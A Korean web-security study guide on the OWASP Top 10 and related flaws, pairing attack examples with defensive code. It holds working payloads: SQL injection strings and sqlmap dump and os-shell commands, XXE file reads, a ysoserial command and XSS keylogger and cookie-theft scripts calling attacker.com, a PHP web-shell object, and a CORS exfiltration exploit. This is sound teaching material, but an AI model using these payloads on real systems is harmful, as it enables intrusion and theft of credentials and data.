# OWASP Top 10 — 웹 취약점 완전 정복

## OWASP 자동화 위협 분류 (Automated Threat Handbook)

OWASP는 웹 애플리케이션에 대한 자동화 위협을 21개 OAT(Ontology of Automated Threats)로 분류합니다.

```
자동화 위협 목록 (주요 항목):
OAT-001 Carding          — 카드 번호 유효성 일괄 검증
OAT-002 Token Cracking   — 인증 토큰 무차별 대입
OAT-003 Ad Fraud         — 광고 클릭 사기
OAT-004 Fingerprinting   — 소프트웨어 지문 수집
OAT-005 Scalping         — 한정 상품 자동 구매 선점
OAT-006 Expediting       — 거래 빠른 처리 유도
OAT-007 Credential Cracking — 계정 자격증명 무차별 대입
OAT-008 Credential Stuffing — 유출 자격증명 목록으로 로그인 시도
OAT-009 CAPTCHA Defeat   — 자동화로 CAPTCHA 풀기
OAT-010 Card Cracking    — 카드 CVV/만료일 무차별 대입
OAT-011 Scraping         — 콘텐츠 자동 수집
OAT-012 Cashing Out      — 훔친 결제 수단 현금화
OAT-013 Sniping          — 경매 막바지 자동 입찰
OAT-014 Vulnerability Scanning — 취약점 자동 스캐닝
OAT-015 Denial of Service — 서비스 거부
OAT-016 Skewing          — 통계/평점 조작
OAT-017 Spamming         — 스팸 콘텐츠 자동 생성
OAT-018 Footprinting     — 앱 구조 자동 탐색/매핑
OAT-019 Account Creation — 가짜 계정 대량 생성
OAT-020 Account Aggregation — 여러 계정 데이터 통합
OAT-021 Denial of Inventory — 재고 선점으로 구매 방해 (v1.2 신규)
```

### 자동화 위협 대응 전략
```
탐지 레이어:
  - 행동 분석 (요청 빈도, 패턴)
  - 디바이스 핑거프린팅
  - JavaScript 챌린지
  - CAPTCHA (단, OAT-009로 우회 가능)

방어 레이어:
  - Rate Limiting (IP/사용자/엔드포인트별)
  - CAPTCHA (고급 — reCAPTCHA v3, hCaptcha)
  - 봇 관리 솔루션 (Cloudflare Bot Management, AWS WAF)
  - 행동 기반 탐지 (마우스 움직임, 클릭 패턴)
  - IP 평판 데이터베이스 연동
```

---

## OWASP Top 10 (2021) 개요

| 순위 | 취약점 | 위험도 |
|------|--------|--------|
| A01 | Broken Access Control (접근 제어 실패) | 매우 높음 |
| A02 | Cryptographic Failures (암호화 실패) | 높음 |
| A03 | Injection (인젝션) | 높음 |
| A04 | Insecure Design (안전하지 않은 설계) | 높음 |
| A05 | Security Misconfiguration (보안 설정 오류) | 높음 |
| A06 | Vulnerable Components (취약한 구성 요소) | 중간 |
| A07 | Authentication Failures (인증 실패) | 높음 |
| A08 | Software and Data Integrity Failures | 높음 |
| A09 | Logging Failures (로깅 실패) | 중간 |
| A10 | SSRF (서버측 요청 위조) | 중간 |

---

## OWASP Top 10 (2017) — 이전 버전 비교

| 순위 | 취약점 | 위험 점수 |
|------|--------|-----------|
| A1:2017 | Injection | 8.0 |
| A2:2017 | Broken Authentication | 7.0 |
| A3:2017 | Sensitive Data Exposure | 7.0 |
| A4:2017 | XML External Entities (XXE) | 7.0 |
| A5:2017 | Broken Access Control | 6.0 |
| A6:2017 | Security Misconfiguration | 6.0 |
| A7:2017 | Cross-Site Scripting (XSS) | 6.0 |
| A8:2017 | Insecure Deserialization | 5.0 |
| A9:2017 | Using Components with Known Vulnerabilities | 4.7 |
| A10:2017 | Insufficient Logging & Monitoring | 4.0 |

### 2013→2017 주요 변경 사항
```
신규 추가:
  A4:2017 - XML External Entities (XXE) — SAST 도구 데이터 기반
  A8:2017 - Insecure Deserialization    — 커뮤니티 투표
  A10:2017 - Insufficient Logging & Monitoring — 커뮤니티 투표

병합:
  A4(IDOR) + A7(Function Level Access Control) → A5:2017 Broken Access Control

삭제:
  A8-CSRF (5%에만 발견, 프레임워크가 대부분 방어)
  A10-Unvalidated Redirects and Forwards (XXE에 밀려 제외)
```

### OWASP 위험도 평가 방식
```
위험 점수 = (공격 용이성 + 탐지 난이도) / 2 × 기술적 영향

예: A6 Security Misconfiguration
  공격 용이성: 3 (쉬움)
  보편성:      3 (광범위)
  탐지 난이도: 3 (쉬움)
  기술적 영향: 2 (보통)
  → 평균 3.0 × 2 = 6.0점
```

---

## A3:2017 Sensitive Data Exposure (민감 데이터 노출)

### 주요 공격 시나리오
```
1. 평문 HTTP 전송
   로그인 폼이 HTTP로 전송 → 중간자 공격으로 자격증명 탈취

2. 약한 암호화 알고리즘 사용
   MD5/SHA-1로 비밀번호 해싱 → 레인보우 테이블 공격으로 복원

3. 암호화 없는 데이터 저장
   신용카드 번호, 주민번호를 평문으로 DB 저장

4. 불필요한 데이터 수집/보관
   GDPR/PCI DSS 위반: 필요 이상의 개인정보 저장
```

### 안전한 비밀번호 해싱 알고리즘
```python
# 나쁜 방법 (MD5, SHA-1, SHA-256 단순 해싱)
import hashlib
hashed = hashlib.md5(password.encode()).hexdigest()  # 위험!

# 좋은 방법 (적응형 해싱 + 솔트)
# Argon2 (가장 권장 - Password Hashing Competition 2015 우승)
from argon2 import PasswordHasher
ph = PasswordHasher(time_cost=2, memory_cost=65536, parallelism=2)
hashed = ph.hash(password)

# bcrypt (널리 사용)
import bcrypt
hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))

# PBKDF2 (Python 내장)
import hashlib, os
salt = os.urandom(32)
key = hashlib.pbkdf2_hmac('sha256', password.encode(), salt, 310000)

# scrypt (메모리 집약적)
import hashlib
hashed = hashlib.scrypt(password.encode(), salt=salt, n=16384, r=8, p=1)
```

### TLS 설정 점검
```bash
# TLS 버전 및 암호 스위트 점검
nmap --script ssl-enum-ciphers -p 443 target.com

# SSL Labs 점검 (A+ 등급 목표)
# https://www.ssllabs.com/ssltest/

# 안전하지 않은 프로토콜 비활성화 (nginx 예시)
ssl_protocols TLSv1.2 TLSv1.3;  # TLS 1.0, 1.1 비활성화
ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256;
ssl_prefer_server_ciphers off;

# HSTS (HTTP Strict Transport Security)
add_header Strict-Transport-Security "max-age=63072000" always;
```

---

## A4:2017 XXE (XML External Entities)

### XXE 공격 원리
```xml
<!-- 정상 XML -->
<user><name>admin</name></user>

<!-- XXE 공격: 외부 엔티티 선언으로 파일 읽기 -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user><name>&xxe;</name></user>
<!-- 서버가 /etc/passwd 내용을 name 필드에 삽입하여 응답 -->
```

### Billion Laughs (DoS 공격)
```xml
<!-- XML 폭탄 — 메모리 소진 DoS -->
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
]>
<lolz>&lol5;</lolz>
<!-- lol5 = 10^5 = 100,000개 "lol" → 수백MB 메모리 사용 -->
```

### SAML XXE (인증 우회)
```
SAML Response (Base64 인코딩된 XML)를 디코딩 후 XXE 삽입
→ SSO 인증 과정에서 XXE 실행
→ 내부 파일 읽기 또는 SSRF

공격 흐름:
1. 정상 SAML 응답 캡처 (Burp Suite)
2. Base64 디코딩
3. XXE 페이로드 삽입
4. 다시 Base64 인코딩
5. 변조된 SAML 응답 전송
```

### XXE 방어
```java
// Java: DocumentBuilderFactory 설정 (XXE 비활성화)
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);

// Python lxml
from lxml import etree
parser = etree.XMLParser(resolve_entities=False, no_network=True)

// 최선의 방어: XML 대신 JSON 사용
// XML 파서를 사용해야 한다면 DTD 처리 완전 비활성화
```

---

## A8:2017 Insecure Deserialization (안전하지 않은 역직렬화)

### 역직렬화 공격 원리
```
직렬화: 객체 → 바이트스트림 (저장/전송용)
역직렬화: 바이트스트림 → 객체 (복원)

공격: 조작된 직렬화 데이터를 서버에 전송
     → 역직렬화 시 임의 코드 실행 (RCE)
```

### Java 역직렬화 공격
```java
// 취약한 코드: 신뢰할 수 없는 입력을 역직렬화
ObjectInputStream ois = new ObjectInputStream(inputStream);
Object obj = ois.readObject();  // 위험!

// 악성 직렬화 데이터 생성 (ysoserial 도구)
// java -jar ysoserial.jar CommonsCollections1 "calc.exe" > payload.ser
// → 역직렬화 시 calc.exe 실행
```

```bash
# ysoserial로 RCE 페이로드 생성
java -jar ysoserial.jar CommonsCollections4 "curl attacker.com/`whoami`" | base64

# 취약한 Java 앱에 전송
curl -X POST http://target.com/api/object \
  -H "Content-Type: application/x-java-serialized-object" \
  --data-binary @payload.ser
```

### PHP 역직렬화 공격
```php
// 취약한 코드
$data = unserialize($_COOKIE['user_data']);  // 위험!

// 공격: __wakeup()/__destruct() 매직 메서드 악용
class Logger {
    public $filename;
    public $data;
    
    function __destruct() {
        file_put_contents($this->filename, $this->data);
    }
}

// 악성 객체 직렬화
$obj = new Logger();
$obj->filename = '/var/www/html/shell.php';
$obj->data = '<?php system($_GET["cmd"]); ?>';
echo serialize($obj);
// → O:6:"Logger":2:{s:8:"filename";s:30:"/var/www/html/shell.php";s:4:"data";s:30:"<?php system($_GET["cmd"]); ?>";}
```

### 방어 방법
```
1. 신뢰할 수 없는 소스의 직렬화 데이터 역직렬화 금지
2. 디지털 서명으로 직렬화 데이터 무결성 검증
   - HMAC 서명: 서버만 아는 비밀키로 서명 → 변조 탐지
3. Java: 안전한 역직렬화 라이브러리 사용
   - SerialKiller: 화이트리스트 기반 클래스 필터
   - NotSoSerial: 에이전트 기반 보호
4. 가능하면 JSON/XML 같은 텍스트 형식 사용
5. 역직렬화 작업을 최소 권한 샌드박스에서 실행
```

---

## A10:2017 Insufficient Logging & Monitoring (불충분한 로깅/모니터링)

### 현실 통계
```
- 평균 침해 탐지 시간: 200일 (IBM 보안 보고서)
- 외부에 의해 침해 발견: 약 2/3 (자체 탐지 실패)
- 랜섬웨어: 평균 80일간 내부에서 잠복 후 발동
```

### 반드시 로깅해야 할 이벤트
```
인증 관련:
  - 로그인 성공/실패 (IP, 타임스탬프, 사용자명)
  - 비밀번호 재설정 시도
  - 계정 잠금
  - 세션 생성/종료

접근 제어:
  - 권한 없는 리소스 접근 시도
  - 관리자 기능 접근
  - 대량 데이터 다운로드

입력 검증:
  - SQL Injection 시도 패턴
  - XSS 페이로드 탐지
  - 파일 경로 탐색 시도
```

### SIEM 연동 로깅 구현
```python
import logging
import json
from datetime import datetime

# 구조화된 보안 로그
def log_security_event(event_type, user, ip, details, severity="INFO"):
    event = {
        "timestamp": datetime.utcnow().isoformat(),
        "event_type": event_type,
        "severity": severity,
        "user": user,
        "source_ip": ip,
        "details": details
    }
    security_logger.warning(json.dumps(event))

# 사용 예시
log_security_event(
    event_type="AUTH_FAILURE",
    user="admin",
    ip="192.168.1.100",
    details={"attempts": 5, "reason": "invalid_password"},
    severity="HIGH"
)

# ELK Stack (Elasticsearch-Logstash-Kibana) 연동
# Logstash 설정 → Elasticsearch 인덱싱 → Kibana 대시보드
```

### 1-10-60 탐지 규칙 (CrowdStrike 기준)
```
1분 내: 침해 탐지
10분 내: 침해 조사
60분 내: 격리 및 차단

현실 평균:
  탐지: 수십~수백 일
  조사: 수 일
  대응: 수 일~수 주
```

---

## OWASP Top 10 위험도 평가 방법론 (OWASP 공식 문서)

```
위험 점수 산출 공식:
  위험 점수 = 위협 가능성 × 영향도

위협 가능성 구성:
  - 공격 용이성 (Exploitability): 쉬움(3) / 보통(2) / 어려움(1)
  - 보편성 (Prevalence): 광범위(3) / 보통(2) / 드뭄(1)
  - 탐지 난이도 (Detectability): 쉬움(3) / 보통(2) / 어려움(1)

기술적 영향도 (Technical Impact):
  - 심각(3) / 보통(2) / 경미(1)

OWASP 기준 데이터:
  - 40개 이상의 보안 회사 데이터 기반
  - 100,000개 이상의 실제 애플리케이션/API 분석
  - 500명 이상의 업계 전문가 설문 결과

CWE 연계:
  OWASP Top 10 항목은 CWE(Common Weakness Enumeration)에 매핑
  → 일관된 취약점 명명 체계 제공
```

### OWASP 위험 평가 실전 적용
```
조직별 맞춤 위험 평가:
  1. 위협 행위자 파악 (내부자/외부 해커/국가 지원 해커)
  2. 기술적 영향 × 비즈니스 영향 계산
  3. PCI DSS, GDPR 등 규정 준수 고려
  4. 산업별 특성 반영 (의료/금융/공공)

ASVS (Application Security Verification Standard):
  - OWASP의 상세 검증 표준 (Level 1~3)
  - Level 1: 자동화 테스트로 확인 가능한 항목
  - Level 2: 일반적인 보안 요구사항
  - Level 3: 고보안 환경 (뱅킹, 의료)
```

---

## A03: SQL Injection (가장 치명적)

### 원리
```
정상 쿼리:
SELECT * FROM users WHERE id='admin' AND pw='password'

공격 (admin' --)
SELECT * FROM users WHERE id='admin' --' AND pw='...'
                                      ↑ 주석으로 뒤를 무효화 → 비밀번호 우회
```

### 기본 SQL Injection 페이로드
```sql
-- 인증 우회
' OR '1'='1
' OR 1=1--
admin'--
' OR 'a'='a

-- 에러 기반 (데이터 추출)
' AND 1=CONVERT(int, (SELECT TOP 1 table_name FROM information_schema.tables))--

-- UNION 기반 (컬럼 수 확인)
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 5--  ← 오류 발생 시 컬럼 수 = 4

-- UNION으로 데이터 추출
' UNION SELECT NULL, NULL, NULL--           (컬럼 수 맞추기)
' UNION SELECT 1, 'text', NULL--
' UNION SELECT 1, table_name, NULL FROM information_schema.tables--
' UNION SELECT 1, column_name, NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT 1, username, password FROM users--
```

### Blind SQL Injection
```sql
-- Boolean-based (참/거짓으로 데이터 추출)
-- 조건이 참이면 정상 페이지, 거짓이면 다른 결과

' AND 1=1--          ← 정상 (참)
' AND 1=2--          ← 비정상 (거짓)

-- 첫 번째 문자가 'a'인지 확인
' AND SUBSTRING((SELECT password FROM users LIMIT 1), 1, 1)='a'--
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1), 1, 1))>97--

-- Time-based (응답 시간으로 추출)
' AND SLEEP(5)--            (MySQL)
' WAITFOR DELAY '0:0:5'--   (MSSQL)
'; SELECT pg_sleep(5)--     (PostgreSQL)

-- 조건부 시간 지연
' AND IF(1=1, SLEEP(5), 0)--
' AND IF((SELECT COUNT(*) FROM users WHERE username='admin')=1, SLEEP(5), 0)--
```

### SQLMap 자동화
```bash
# 기본 사용법
sqlmap -u "http://target.com/page.php?id=1"

# POST 파라미터
sqlmap -u "http://target.com/login.php" --data="user=admin&pass=test"

# 쿠키 인증
sqlmap -u "http://target.com/page.php?id=1" --cookie="session=abc123"

# 데이터베이스 열거
sqlmap -u "http://target.com/?id=1" --dbs          # DB 목록
sqlmap -u "http://target.com/?id=1" -D mydb --tables  # 테이블 목록
sqlmap -u "http://target.com/?id=1" -D mydb -T users --columns  # 컬럼
sqlmap -u "http://target.com/?id=1" -D mydb -T users --dump     # 데이터 추출

# OS 쉘 시도
sqlmap -u "http://target.com/?id=1" --os-shell

# 파일 읽기 (MySQL FILE 권한 필요)
sqlmap -u "http://target.com/?id=1" --file-read="/etc/passwd"

# 속도 및 스텔스 옵션
sqlmap -u "http://target.com/?id=1" --level=5 --risk=3 --delay=1
sqlmap -u "http://target.com/?id=1" --random-agent  # User-Agent 랜덤화
```

### SQL Injection 방어
```php
// PDO Prepared Statement (가장 안전)
$stmt = $pdo->prepare('SELECT * FROM users WHERE id = ? AND pw = ?');
$stmt->execute([$id, $pw]);

// MySQLi Prepared Statement
$stmt = $mysqli->prepare("SELECT * FROM users WHERE username=? AND password=?");
$stmt->bind_param("ss", $username, $password);
$stmt->execute();

// 입력값 검증 (추가 방어)
$id = filter_input(INPUT_GET, 'id', FILTER_SANITIZE_STRING);
$id = intval($id);  // 숫자만 허용
```

---

## A03: XSS (Cross-Site Scripting)

### XSS 종류

#### 1. Reflected XSS (반사형)
```
공격자가 악성 링크를 피해자에게 전달
피해자 클릭 → 서버에서 입력값 그대로 반영 → 브라우저에서 실행

URL: http://target.com/search?q=<script>alert('XSS')</script>

서버 응답:
<div>검색결과: <script>alert('XSS')</script></div>
```

#### 2. Stored XSS (저장형, 더 위험)
```
공격자가 악성 스크립트를 DB에 저장
다른 사용자가 해당 페이지 방문 시 자동 실행

예: 게시판 글쓰기
내용: <script>document.location='http://attacker.com/steal?c='+document.cookie</script>
```

#### 3. DOM-based XSS
```
서버 응답 없이 JavaScript로만 처리되는 XSS
개발자 도구로만 탐지 가능 (서버 로그에 안 남음)

취약 코드:
document.getElementById('output').innerHTML = location.hash.slice(1);

공격: http://target.com/page.html#<img src=x onerror=alert(1)>
```

### XSS 페이로드 모음
```javascript
// 기본 테스트
<script>alert('XSS')</script>

// 필터 우회 (대소문자)
<SCRIPT>alert('XSS')</SCRIPT>
<ScRiPt>alert('XSS')</ScRiPt>

// 이벤트 핸들러
<img src=x onerror=alert('XSS')>
<body onload=alert('XSS')>
<input onfocus=alert('XSS') autofocus>
<svg onload=alert('XSS')>

// JavaScript 프로토콜
<a href="javascript:alert('XSS')">click</a>

// 스크립트 태그 없는 방법
<iframe src="javascript:alert('XSS')"></iframe>

// 쿠키 탈취
<script>
  document.location='http://attacker.com/steal.php?c='+document.cookie;
</script>

// 키로거
<script>
  document.onkeypress = function(e) {
    new Image().src = 'http://attacker.com/log?k=' + e.key;
  };
</script>

// 필터 우회 (인코딩)
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
<script>eval(atob('YWxlcnQoMSk='))</script>  // base64
```

### XSS 방어
```php
// PHP에서 출력 시 HTML 엔티티 인코딩
echo htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');
echo htmlentities($user_input, ENT_QUOTES, 'UTF-8');

// JavaScript 컨텍스트에 삽입 시
echo json_encode($user_input);
```
```javascript
// JavaScript에서 DOM 조작 시
element.textContent = userInput;    // 안전 (HTML 해석 안 함)
// 위험:
element.innerHTML = userInput;      // XSS 가능!
```
```
// CSP (Content Security Policy) 헤더
Content-Security-Policy: script-src 'self'; object-src 'none';
```

---

## A01: Broken Access Control

### IDOR (Insecure Direct Object Reference)
```
취약 예시:
https://target.com/api/user/1234/profile  ← 내 프로필
https://target.com/api/user/1235/profile  ← 다른 사용자 프로필 (그냥 접근 가능!)

공격:
1. ID 1234 → 1235로 변경 (순차적 열거)
2. UUID로 돼있어도 다른 사용자 UUID 시도

방어:
- 서버에서 세션의 사용자 ID와 요청 자원의 소유자 비교
- 간접 참조 맵 사용 (내부 ID를 외부에 노출하지 않음)
```

### 파일 경로 탐색 (Path Traversal)
```
공격 예시:
https://target.com/file?name=../../../etc/passwd
https://target.com/file?name=....//....//etc/passwd (인코딩 우회)
https://target.com/file?name=%2e%2e%2f%2e%2e%2fetc%2fpasswd (URL 인코딩)

Windows:
https://target.com/file?name=..\..\..\..\windows\system32\drivers\etc\hosts

방어:
$filename = basename($filename);  // 경로 제거
$safe_path = realpath('/uploads/' . $filename);
if (!str_starts_with($safe_path, '/uploads/')) { die('Invalid'); }
```

---

## A07: Authentication Failures

### 세션 하이재킹
```
세션 쿠키 탈취 방법:
1. XSS로 document.cookie 탈취
2. 네트워크 스니핑 (HTTP 평문 전송)
3. 브라우저 히스토리/캐시

방어:
Set-Cookie: sessionid=abc123; HttpOnly; Secure; SameSite=Strict
- HttpOnly: JavaScript에서 접근 불가 (XSS 방어)
- Secure: HTTPS에서만 전송
- SameSite: CSRF 방어
```

### 비밀번호 재설정 취약점
```
흔한 취약점:
1. 예측 가능한 토큰 (타임스탬프, 순차적 숫자)
2. 토큰 만료 없음
3. 이메일 없이 토큰만으로 재설정 가능
4. 계정 열거 (유효한 이메일이면 다른 응답)

방어:
- 암호학적으로 안전한 랜덤 토큰 (os.urandom(32))
- 짧은 만료 시간 (15분)
- 단일 사용 토큰
```

---

## A05: Security Misconfiguration

### 기본 설정의 위험성
```bash
# 흔한 기본 자격 증명
admin:admin
admin:password
root:root
admin:123456

# 취약한 서버 설정 확인
# Apache 디렉토리 리스팅
curl http://target.com/uploads/  # 파일 목록 노출?

# 에러 메시지에 민감 정보 포함
curl http://target.com/page?id=abc
# → MySQL error: You have an error in your SQL syntax...
#   → DB 타입, 쿼리 구조 노출!

# 디버그 모드 활성화
curl http://target.com/
# → X-Powered-By: PHP/7.4.1
# → Server: Apache/2.4.49
# → 버전 정보로 알려진 취약점 공격 가능
```

### 방화벽/네트워크 설정
```bash
# 불필요한 포트 확인
nmap -sV --script=banner target.com

# 관리 인터페이스 노출 확인
nmap -p 8080,8443,9090,9200,27017 target.com
# 8080: Tomcat 관리자
# 9200: Elasticsearch (인증 없음!)
# 27017: MongoDB (인증 없음!)

# 기본 자격증명으로 관리 패널 접근 시도
curl http://target.com:9200/_cat/indices  # Elasticsearch DB 목록
curl http://target.com:27017/            # MongoDB
```

---

## A10: SSRF (Server Side Request Forgery)

### SSRF 원리
```
서버가 사용자가 제공한 URL에 요청을 보낼 때 발생
→ 내부 네트워크 접근, 클라우드 메타데이터 접근 등

취약 코드 예시:
$url = $_GET['url'];
$content = file_get_contents($url);  // 서버가 임의 URL에 요청!
echo $content;

공격:
1. 내부 서비스 접근
   ?url=http://localhost:8080/admin
   ?url=http://192.168.1.1/admin

2. AWS 메타데이터 접근 (클라우드 환경 핵심!)
   ?url=http://169.254.169.254/latest/meta-data/
   ?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

3. 포트 스캔
   ?url=http://localhost:22
   ?url=http://internal.server:3306
```

### SSRF 방어
```python
import ipaddress
import urllib.parse

def is_safe_url(url):
    parsed = urllib.parse.urlparse(url)
    hostname = parsed.hostname
    
    try:
        ip = ipaddress.ip_address(hostname)
        # 사설 IP, 루프백, 링크로컬 차단
        if ip.is_private or ip.is_loopback or ip.is_link_local:
            return False
    except ValueError:
        pass  # IP가 아닌 도메인명
    
    # 화이트리스트 기반
    allowed = ['api.example.com', 'cdn.example.com']
    if hostname not in allowed:
        return False
    
    return True
```

---

## 웹 해킹 실전 도구 정리

### Burp Suite 기본 사용
```
1. Proxy → Intercept 활성화
2. 브라우저 프록시: 127.0.0.1:8080
3. HTTP 트래픽 캡처 및 수정
4. Repeater: 요청 반복 전송 및 분석
5. Intruder: 자동화 공격 (브루트포스, 퍼징)
6. Scanner: 자동 취약점 스캔 (Pro 버전)
```

### Nikto (웹 서버 취약점 스캐너)
```bash
nikto -h http://target.com
nikto -h http://target.com -p 8080
nikto -h http://target.com -ssl  # HTTPS
nikto -h http://target.com -output report.html -Format htm
```

### Gobuster (디렉토리/파일 열거)
```bash
# 디렉토리 열거
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt

# 파일 확장자 지정
gobuster dir -u http://target.com -w common.txt -x php,html,txt

# 서브도메인 열거
gobuster dns -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# 가상 호스트 열거
gobuster vhost -u http://target.com -w subdomains.txt
```

---

## CORS 취약점 (Cross-Origin Resource Sharing)

### CORS 오설정 탐지
```bash
# CORS 헤더 확인
curl -H "Origin: https://evil.com" -I https://target.com/api/data

# 취약한 응답 예시
Access-Control-Allow-Origin: https://evil.com     # 공격자 도메인 반영
Access-Control-Allow-Credentials: true            # 쿠키 포함 허용
# → CORS + ACAO + ACAC = 민감 데이터 탈취 가능
```

### CORS 공격 익스플로잇
```html
<!-- 공격자 사이트에서 실행 -->
<script>
fetch('https://target.com/api/sensitive-data', {
  credentials: 'include'  // 피해자 쿠키 포함
})
.then(r => r.json())
.then(data => {
  // 민감 데이터를 공격자 서버로 전송
  fetch('https://attacker.com/steal?data=' + JSON.stringify(data));
});
</script>
```

### CORS 취약 패턴
```
1. Null Origin 허용
   Access-Control-Allow-Origin: null
   → 파일 기반 HTML이나 샌드박스 iframe에서 악용

2. 서브도메인 와일드카드 매칭 버그
   if (origin.endsWith('target.com')) → evil-target.com 도 허용!

3. Access-Control-Allow-Origin: * + 인증 정보
   와일드카드와 credentials는 함께 사용 불가 (브라우저 차단)
   → 단, 서버가 직접 origin을 복사하면 우회됨
```

### CORS 방어
```python
# 화이트리스트 기반 CORS 검증
ALLOWED_ORIGINS = ['https://app.example.com', 'https://admin.example.com']

def cors_check(origin):
    if origin in ALLOWED_ORIGINS:
        return origin
    return None  # 허용하지 않음

# Flask 예시
from flask_cors import CORS
CORS(app, origins=ALLOWED_ORIGINS, supports_credentials=True)
```

---

## JWT 보안 취약점

### JWT 검증 우회 패턴
```
1. alg:none 공격
   알고리즘을 "none"으로 설정하면 일부 라이브러리가 서명 검증 생략

2. RS256 → HS256 알고리즘 혼동
   서버의 RSA 공개키를 HMAC 비밀키로 오용

3. 약한 비밀키
   HS256 비밀키가 "secret", "password" 등이면 오프라인 브루트포스 가능

4. 토큰 무효화 실패
   로그아웃해도 서버가 토큰 블랙리스트 관리 안 하면 토큰 재사용 가능
```

### JWT 클레임 변조 탐지 실습
```bash
# 1. JWT 디코딩 (base64)
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
# → {"alg":"HS256","typ":"JWT"}

# 2. jwt_tool로 취약점 테스트
python3 jwt_tool.py TOKEN -X a  # alg:none
python3 jwt_tool.py TOKEN -X s  # 서명 혼동
python3 jwt_tool.py TOKEN -C -d /usr/share/wordlists/rockyou.txt  # 비밀키 크랙

# 3. hashcat으로 HS256 비밀키 크랙
hashcat -a 0 -m 16500 jwt_token.txt wordlist.txt
```

### JWT 안전한 구현
```python
import jwt
from datetime import datetime, timedelta

SECRET_KEY = secrets.token_hex(32)  # 충분히 긴 랜덤 키

# 토큰 발급
payload = {
    'sub': user_id,
    'iat': datetime.utcnow(),
    'exp': datetime.utcnow() + timedelta(hours=1),  # 만료 시간 설정
    'jti': str(uuid.uuid4())  # 고유 ID (재사용 방지)
}
token = jwt.encode(payload, SECRET_KEY, algorithm='HS256')

# 토큰 검증 (알고리즘 명시 필수)
decoded = jwt.decode(token, SECRET_KEY, algorithms=['HS256'])  # 알고리즘 고정

# 로그아웃 시 토큰 블랙리스트 처리
redis_client.setex(f"blacklist:{jti}", 3600, "revoked")
```
